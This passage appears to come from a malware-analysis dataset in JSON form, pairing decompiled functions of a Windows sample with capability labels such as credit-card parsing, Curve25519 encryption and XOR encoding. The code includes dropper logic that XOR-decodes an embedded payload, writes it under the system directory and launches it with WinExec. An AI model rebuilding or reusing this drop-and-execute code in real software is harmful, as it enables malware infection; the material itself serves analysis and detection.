 uStack13 = 7;\n    uStack12 = 0;\n    uStack11 = 0;\n    uStack17 = 0xa8;\n    uStack16 = 0x23;\n    uStack15 = 0x42;\n    uStack14 = 0;\n    uStack21 = 0x16;\n    uStack20 = 0;\n    uStack19 = 0;\n    uStack18 = 0;\n    uStack25 = 0xb4;\n    uStack24 = 0x4224;\n    uStack22 = 0;\n    uStack29 = 0x40203c;\n    fcn.00403890();\n    return;\n}\n",
        "token_count": 3982
    },
    "00402f90": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402f90(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.004036e0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00402dc0();\n        arg_ch_01 = fcn.00402dc0();\n        arg_ch_02 = fcn.00402dc0();\n        fcn.00403c00(arg_10h, arg_ch_00);\n        fcn.00403c00(arg_8h, arg_ch_01);\n        fcn.00403c00(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x422048, &lpBuffer, arg_10h);\n        iVar2 = fcn.00403840(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x422054, &lpBuffer, arg_8h);\n            iVar2 = fcn.00403840(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x422054, &lpBuffer, arg_ch);\n                iVar2 = fcn.00403840(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00403c00(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 614
    },
    "00403db0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nbool fcn.00403db0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcbData = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x422484, 0x4224ac, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 318
    },
    "00402050": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004022de) overlaps instruction at (ram,0x004022d9)\n// \n\nvoid __fastcall fcn.00402050(uchar *param_1, ushort param_2)\n\n{\n    uint8_t *puVar1;\n    ushort uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int16_t extraout_CX;\n    char extraout_CH;\n    ushort extraout_CX_00;\n    uint8_t uVar6;\n    uint32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t extraout_EDX;\n    uint32_t unaff_EBX;\n    uint32_t uVar7;\n    char *pcVar8;\n    int32_t *unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar9;\n    int32_t *piVar10;\n    ushort in_ES;\n    bool in_CF;\n    bool bVar11;\n    bool in_ZF;\n    char cVar12;\n    bool bVar13;\n    uchar uVar14;\n    bool in_OF;\n    uchar uVar15;\n    char cVar16;\n    float10 fVar17;\n    ulong uVar18;\n    uint *puVar19;\n    uchar uVar20;\n    uchar uStack27;\n    uchar uStack26;\n    uchar uStack25;\n    uchar uStack24;\n    uchar uStack23;\n    ushort uStack22;\n    uchar uStack20;\n    ushort uStack19;\n    uchar uStack17;\n    uchar uStack16;\n    uchar uStack15;\n    uchar uStack14;\n    uchar uStack13;\n    uchar uStack12;\n    ushort uStack11;\n    uchar uStack9;\n    \n    uStack12 = SUB41(unaff_EDI, 0);\n    uStack11 = unaff_EDI >> 8;\n    uStack9 = unaff_EDI >> 0x18;\n    if (in_OF) {\ncode_r0x00402077:\n        uStack16 = 0x20;\n        uStack20 = 0xb0;\n        uStack19 = 0x4223;\n        uStack17 = 0;\n        puVar9 = unaff_EDI;\n    }\n    else {\n        uStack14 = param_2;\n        uStack13 = param_2 >> 8;\n        if (!in_OF) goto code_r0x00402077;\n        puVar9 = unaff_EDI + 1;\n        uVar20 = in(param_2);\n        *unaff_EDI = uVar20;\n        uVar7 = CONCAT31(unaff_EBX >> 8, 0xbc);\n        if (!in_CF && !in_ZF) goto code_r0x004020e2;\n        uStack16 = 0x56;\n        unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*param_1, 0xbc);\n    }\n    uStack13 = 0;\n    uStack14 = 0;\n    uStack15 = 0;\n    uStack24 = 0x16;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack27 = 0x24;\n    uStack26 = 0x42;\n    uStack25 = 0;\n    fcn.00403890();\n    uStack16 = 0x26;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0xd0;\n    uStack19 = 0x4223;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack27 = 0x24;\n    uStack26 = 0x42;\n    uStack25 = 0;\n    fcn.00403890();\n    uStack16 = 8;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0xf8;\n    uStack19 = 0x4223;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack27 = 0x24;\n    uStack26 = 0x42;\n    uStack25 = 0;\n    fcn.00403890();\n    uStack14 = unaff_EBX;\n    uStack13 = unaff_EBX >> 8;\n    uVar7 = unaff_EBX;\ncode_r0x004020e2:\n    uVar20 = uStack14;\n    bVar11 = false;\n    uVar2 = CONCAT11(uStack13, uStack14);\n    uStack16 = 0x19;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0;\n    uStack19 = 0x4224;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack27 = 0x24;\n    uStack26 = 0x42;\n    uStack25 = 0;\n    uVar4 = fcn.00403890();\n    if ((!bVar11) && (bVar11)) {\n        out(0xbd, uVar4);\n        return;\n    }\n    fcn.00403890(0xb4, 0x16, 0x42241c);\n    uVar14 = &uStack12 < 0;\n    bVar11 = *0x10 == 0xc;\n    uVar3 = CONCAT12(uVar7 >> 0x10, uVar2);\n    pcVar8 = uVar7 & 0xff000000 | uVar3;\n    uStack16 = 0x12;\n    uStack15 = 0;\n    uStack14 = 0;\n    uStack13 = 0;\n    uStack20 = 0x28;\n    uStack19 = 0x4224;\n    uStack17 = 0;\n    uStack24 = 0x16;\n    uStack23 = 0;\n    uStack22 = 0;\n    uStack27 = 0x24;\n    uStack26 = 0x42;\n    uStack25 = 0;\n    fcn.00403890();\n    if ((!bVar11) && (bVar11)) {\n        uVar14 = &uStack27 < 0;\n    }\n    fVar17 = fcn.00403890(0xb4);\n    if ((!uVar14) && (uVar14)) {\n        *(puVar9 + 0x1c) = fVar17;\n        puVar9 = puVar9 + 5;\n        unaff_ESI = unaff_ESI + 5;\n    }\n    fcn.00403890(0x4224b4, 0x16, 0x50, 2);\n    uStack11 = 8;\n    uStack9 = 0;\n    uStack15 = 0x54;\n    uStack14 = 0x24;\n    uStack13 = 0x42;\n    uStack12 = 0;\n    uStack19 = 0x16;\n    uStack17 = 0;\n    uStack16 = 0;\n    uStack23 = 0xb4;\n    uStack22 = 0x4224;\n    uStack20 = 0;\n    uStack27 = 0xbc;\n    uStack26 = 0x21;\n    uStack25 = 0x40;\n    uStack24 = 0;\n    fcn.00403890();\n    uVar14 = extraout_ECX < 0x5354;\n    uVar15 = SBORROW4(extraout_ECX, 0x5354);\n    cVar12 = extraout_ECX == 0x5354;\n    piVar10 = puVar9 & 0xffff0000 | puVar9 & 0xff | (puVar9 >> 8) << 8;\n    while( true ) {\n        uStack15 = 0x5c;\n        uStack14 = 0x24;\n        uStack13 = 0x42;\n        uStack12 = 0;\n        uStack19 = 0x16;\n        uStack17 = 0;\n        uStack16 = 0;\n        uStack11 = 0x24b4;\n        uStack9 = 0x42;\n        uStack27 = 0xe7;\n        uStack26 = 0x21;\n        uStack25 = 0x40;\n        uStack24 = 0;\n        fcn.00403890();\n        if ((uVar14) || (!uVar14)) break;\n        if (extraout_ECX_00 == 1 || cVar12 == '\\0') {\n            *piVar10 = unaff_ESI + 1;\n            unaff_ESI = 0x6ab8ec44;\n            uStack27 = in_ES;\n            uStack26 = in_ES >> 8;\ncode_r0x00402202:\n            iVar5 = fcn.00403890();\n            if ((!uVar14 && !cVar12) && (uVar14 || cVar12)) {\n                uVar15 = SBORROW4(iVar5, iVar5);\n                *piVar10 = *unaff_ESI;\n                pcVar8 = uVar7 & 0xff000000 | uVar3 & 0xffff0000 | CONCAT11(0xdf, uVar20);\n                piVar10 = piVar10 + 1;\n            }\n            uVar20 = 0x6c;\n            uVar4 = 0x16;\n            puVar19 = 0x4224b4;\n            fcn.00403890(0x4224b4, 0x16, 0x6c);\n            if ((!uVar15) && (uVar15)) {\n                *puVar19 = CONCAT13(uStack24, CONCAT12(uStack25, CONCAT11(uStack26, uStack27)));\n                return;\n            }\n            cVar12 = fcn.00403890(0x4224b4, 0x16, 0x422474, 7);\n            bVar11 = false;\n            bVar13 = ((extraout_CX + 1U & 0xff | (extraout_CX + 1U >> 8 & cVar12 + 2U) << 8) & 0x7bc9) == 0;\n            uStack11 = 6;\n            uStack9 = 0;\n            uStack15 = 0x7c;\n            uStack14 = 0x24;\n            uStack13 = 0x42;\n            uStack12 = 0;\n            uStack19 = 0x16;\n            uStack17 = 0;\n            uStack16 = 0;\n            uStack23 = 0xb4;\n            uStack22 = 0x4224;\n            uStack20 = 0;\n            uStack27 = 0xa9;\n            uStack26 = 0x22;\n            uStack25 = 0x40;\n            uStack24 = 0;\n            fcn.00403890();\n            if ((bVar11 || bVar13) || (!bVar11 && !bVar13)) {\n                uStack27 = 0x25;\n                uStack26 = 0;\n                uStack25 = 0;\n                uStack24 = 0;\n            }\n            cVar12 = *pcVar8;\n            *(piVar10 + 0x6a) = *(piVar10 + 0x6a) - &stack0xffffffdd;\n            pcVar8 = extraout_EDX + 0x16;\n            cVar16 = SCARRY1(*pcVar8, extraout_CH - cVar12);\n            *pcVar8 = *pcVar8 + (extraout_CH - cVar12);\n            cVar12 = *pcVar8 < '\\0';\n            bVar11 = *pcVar8 == '\\0';\n            uVar18 = fcn.00403890();\n            if ((bVar11 || cVar16 != cVar12) || (!bVar11 && cVar16 == cVar12)) {\n                uVar20 = 0xac;\n                uVar4 = 0x16;\n            }\n            puVar1 = uVar18 + 0x6a39da56;\n            *puVar1 = *puVar1 ^ extraout_CX_00;\n            puVar1 = uVar18 + -0x54;\n            uVar6 = extraout_CX_00 >> 8;\n            *puVar1 = *puVar1 | uVar6;\n            pcVar8 = (uVar18 >> 0x20) + 0x16;\n            *pcVar8 = *pcVar8 + uVar6;\n            fcn.00403890(0x4224b4, uVar4, uVar20);\n            return;\n        }\n    }\n    uStack27 = 6;\n    uStack26 = 0;\n    uStack25 = 0;\n    uStack24 = 0;\n    goto code_r0x00402202;\n}\n",
        "token_count": 2935
    },
    "00403520": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403520(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00401700();\n        fcn.00401140();\n        fcn.004045a0();\n        if (*0x4224e4 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00402940();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 145
    },
    "00402940": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402940(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4224e8 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00403c00(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x422308, acStack1304, &uStack2112);\n    uStack2088 = 0x422390;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4223a8;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00403290(auStack1564, 0x422304, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1866
    },
    "00403420": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040347f) overlaps instruction at (ram,0x0040347b)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403420(int32_t arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int16_t extraout_CX;\n    uint16_t uVar4;\n    int32_t iVar5;\n    bool bVar6;\n    float10 extraout_ST0;\n    float10 fVar7;\n    double in_stack_3b6692c5;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = fcn.00403c50(0, arg_8h, arg_ch + 1U >> 1);\n    iVar3 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    bVar6 = false;\n    uVar4 = extraout_CX - 1U & arg_8h | 0x61be;\n    uVar1 = *(iVar3 + 0x58);\n    if ((uVar4 < 1) || (0 < uVar4)) {\n        bVar6 = uVar2 < uVar1;\n        fVar7 = extraout_ST0;\n    }\n    else {\n        fVar7 = extraout_ST0 - in_stack_3b6692c5;\n        LOCK();\n    }\n    if (bVar6) {\n        iVar5 = (uVar2 - uVar1 & 0xffff) - 1;\n    }\n    else {\n        iVar5 = uVar2 - (uVar1 & 0xffff);\n    }\n    if (iVar5 < uVar1 >> 0x10) {\n        iVar5 = (iVar5 - (uVar1 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar5 = iVar5 - (uVar1 >> 0x10);\n    }\n    if ((-1 < iVar5) && (-1 >= iVar5)) {\n        *(arg_8h + 0x1c) = fVar7;\n        iVar5 = iVar5 + 5;\n    }\n    *arg_14h = iVar5 + arg_ch;\n    *arg_10h = *(iVar3 + 0x58);\n    return;\n}\n",
        "token_count": 546
    },
    "00403c50": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403c50(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    uint32_t unaff_EBX;\n    uint *puVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint16_t *puVar7;\n    bool bVar8;\n    uint uStack23;\n    ushort uStack19;\n    uchar uStack17;\n    \n    puVar5 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    puVar7 = puVar5[3];\n    if (puVar5[4] == 0) {\n        return (puVar5[2] >> 0x10) + puVar5[2];\n    }\n    puVar5[3] = puVar5[4];\n    do {\n        uStack19 = unaff_EBX;\n        uStack17 = unaff_EBX >> 0x10;\n        unaff_EBX = unaff_EBX & 0xffffff;\n        uVar3 = puVar5[2] + *puVar7;\n        puVar5[2] = uVar3;\n        bVar8 = uVar3 >> 0x10 != 0;\n        puVar6 = puVar5;\n        if (bVar8) {\n            if ((bVar8) && (!bVar8)) {\n                puVar4 = &uStack19;\n                puVar6 = &uStack19;\n                uStack19 = SUB42(puVar5, 0);\n                uStack17 = puVar5 >> 0x10;\n                cVar2 = '\\x10';\n                do {\n                    puVar5 = puVar5 + -1;\n                    puVar4 = puVar4 + -1;\n                    *puVar4 = *puVar5;\n                    cVar2 = cVar2 + -1;\n                } while ('\\0' < cVar2);\n            }\n            uVar3 = (uVar3 >> 0x10) + (uVar3 & 0xffff);\n            puVar6[2] = uVar3;\n        }\n        iVar1 = puVar6[3];\n        puVar7 = puVar7 + 1;\n        puVar6[3] = iVar1 + -1;\n        puVar5 = puVar6;\n    } while (iVar1 + -1 != 0);\n    return (uVar3 >> 0x10) + uVar3;\n}\n",
        "token_count": 559
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl main(uint argv)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint lpMsg;\n    \n    iVar4 = fcn.004015e0(argv);\n    if ((iVar4 != 0) && (iVar5 = fcn.00404da0(argv),  pcVar1 = _sym.imp.USER32.dll_GetMessageA,  iVar5 != 0)) {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageA)(&lpMsg, 0, 0, 0);\n        pcVar3 = _sym.imp.USER32.dll_GetDesktopWindow;\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        while (iVar5 != 0) {\n            (*pcVar2)(&lpMsg);\n            (*pcVar3)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n            iVar5 = (*pcVar1)(&lpMsg, 0, 0, 0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "00401590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401590(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00401640": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00401640(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004024e0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 53
    },
    "00401670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401670(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (arg_14h != 0) {\n        do {\n            uVar1 = var_8h + 1;\n            *(var_8h + arg_10h) = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            var_8h = uVar1;\n        } while (uVar1 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 202
    },
    "00402300": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402331) overlaps instruction at (ram,0x0040232f)\n// \n\nvoid __cdecl fcn.00402300(char **arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00402390();\n    fcn.00401670(&var_68h, var_4h, str.x8_, 0xa020);\n    *arg_8h = str.x8_;\n    *arg_ch = 0xa020;\n    return;\n}\n",
        "token_count": 249
    },
    "00402390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402496) overlaps instruction at (ram,0x00402491)\n// \n\nulong __fastcall fcn.00402390(uint16_t param_1, int32_t *param_2)\n\n{\n    uint32_t *puVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint32_t in_EAX;\n    uint uVar6;\n    uint32_t unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    int32_t *unaff_ESI;\n    int32_t *piVar9;\n    int32_t *piVar10;\n    int32_t **unaff_EDI;\n    bool in_PF;\n    bool bVar11;\n    uint8_t in_AF;\n    float10 in_ST0;\n    int32_t in_stack_5f9dff5f;\n    int32_t **in_stack_ffffffd0;\n    uint *puStackY40;\n    uint16_t in_stack_ffffffe4;\n    ushort in_stack_ffffffe6;\n    uint8_t in_stack_ffffffe8;\n    uint16_t in_stack_ffffffec;\n    uint16_t in_stack_ffffffee;\n    uint32_t uVar5;\n    \n    puVar8 = &stack0xfffffffc;\n    piVar9 = unaff_ESI;\n    if ((in_PF) || (puVar8 = &stack0xfffffffc,  !in_PF)) {\ncode_r0x004023b5:\n        param_2 = puVar8[2];\n        *param_2 = 0x35;\n        piVar10 = piVar9;\n        if ((in_PF) || (!in_PF)) {\ncode_r0x004023da:\n            *(param_2 + 1) = 0x62;\n            *(param_2 + 2) = 0xcd;\n            *(param_2 + 3) = 0x2a;\n            in_stack_ffffffe6 = SUB42(piVar10, 0);\n            in_stack_ffffffe8 = piVar10 >> 0x10;\n            in_stack_ffffffee = in_EAX >> 0x10;\n            in_stack_ffffffec = in_EAX;\n            *(param_2 + 1) = 0xeb;\n            if (('\\0' < in_EAX) && (in_EAX < '\\x01')) {\n                *(in_EAX + 0x8316dbec) = in_ST0;\n                in_stack_ffffffec = unaff_EBX;\n                in_stack_ffffffee = unaff_EBX >> 0x10;\n                uVar4 = in_EAX - 1;\n                uVar3 = 9 < (uVar4 & 0xf) | in_AF;\n                uVar4 = uVar4 + uVar3 * '\\x06';\n                uVar5 = in_EAX - 1 & 0xffffff00 | uVar4 + (0x90 < (uVar4 & 0xf0) | uVar3 * (0xf9 < uVar4)) * '`';\n                in_stack_ffffffe4 = param_1;\n                goto code_r0x00402413;\n            }\n            *(param_2 + 5) = 0x11;\n            in_stack_ffffffe8 = param_1;\n            in_stack_ffffffe4 = param_2;\n            in_stack_ffffffe6 = param_2 >> 0x10;\n            in_stack_ffffffd0 = unaff_EDI;\n            puStackY40 = puVar8;\n            goto code_r0x00402420;\n        }\n        piVar10 = *unaff_EDI;\n        *unaff_EDI = piVar9;\n        puVar8 = puVar8 - *(puVar8 + 0x5f9dff63);\n        if (puVar8 < 0) {\ncode_r0x00402356:\n            uVar6 = fcn.00401670(puVar8 + -0x1a, puVar8[-1], str.x8_, 0xa020);\n            puVar7 = puVar8[3];\n            *puVar8[2] = str.x8_;\n            *puVar7 = 0xa020;\n            return CONCAT44(puVar7, uVar6);\n        }\n        if (piVar10 < 0) goto code_r0x004023da;\n    }\n    else {\n        piVar9 = *unaff_EDI;\n        